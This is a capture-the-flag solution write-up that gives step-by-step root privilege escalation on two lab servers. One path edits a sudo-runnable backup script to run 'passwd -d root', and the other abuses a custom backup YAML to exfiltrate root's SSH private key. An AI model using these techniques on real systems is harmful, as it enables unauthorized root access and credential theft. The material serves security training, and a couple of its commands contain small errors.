# Call for Backup Solution


### Web Server Flag

This solution will make the root account passwordless by leveraging the write permissions on the backup script.

1. From the backup server, SSH into the web server (no password needed)
2. Open the backup script with your favorite editor: `/usr/local/bin/backup.py`
3. Add a new function called `delete_password()`:

  ```
   def delete_password():
     cmd = [‘passwd -d root’]
     process = subprocess.Popen(cmd,shell=False)
     process = process.communicate()
  ```

4. Within the `main()` function, comment out all lines that refer to `backup_parser` and `restore_parser`:

```
def main():

  import argparse

  parser = argparse.ArgumentParser()
  subparser = parser.add_subparsers()

  #backup_parser = subparser.add_parser('backup')
  #backup_parser.add_argument(nargs='?',dest='config', default='backup.yaml')
  #backup_parser.set_defaults(func=backup)

  #restore_parser = subparser.add_parser('restore')
  #restore_parser.add_argument(nargs='?',dest='config', default='restore.yaml')
  #restore_parser.set_defaults(func=restore)

```

5. Add a call to the `delete_password()` function somewhere in the main() function:

```
def main():

  import argparse

  delete_password()

  parser = argparse.ArgumentParser()
  subparser = parser.add_subparsers()

  #backup_parser = subparser.add_parser('backup')
  #backup_parser.add_argument(nargs='?',dest='config', default='backup.yaml')
  #backup_parser.set_defaults(func=backup)

  #restore_parser = subparser.add_parser('restore')
  #restore_parser.add_argument(nargs='?',dest='config', default='restore.yaml')
  #restore_parser.set_defaults(func=restore)

```

6. Run the script with the user account using sudo: `sudo backup.py`
7. Log into the root account: `su - root`
8. Obtain the flag from within: `/root`

### Database Server Flag

This solution will require the user to analyze the code and see that you can specify an alternative .yaml file to the backup command.

1. From the backup server, SSH into the database server (no password needed)
2. Create a new backup yaml file called: `new_backup.yaml` with the following contents:

```
host: db
backup_host: db
mount_points:  
  - /root/.ssh
```

3. Run the backup scripts using `sudo` and specify the newly created file as an argument: `sudo backup.py backup new_backup.yaml`
4. The above command returns a tar file in the user's home directory. Extract the contents: `tar -zxf <backup_name>`
5. Create an ssh-agent session:

```
eval `ssh-agent`
```

6. Add root's private key to the ssh-agent session: `ssh-agent add root/.ssh/id_rsa`
7. SSH into the database server as root from the user account: `ssh root@db`
8. Obtain the flag from within: `/root`

### Submission

The flag is generated by infinity and will change with each challenge iteration.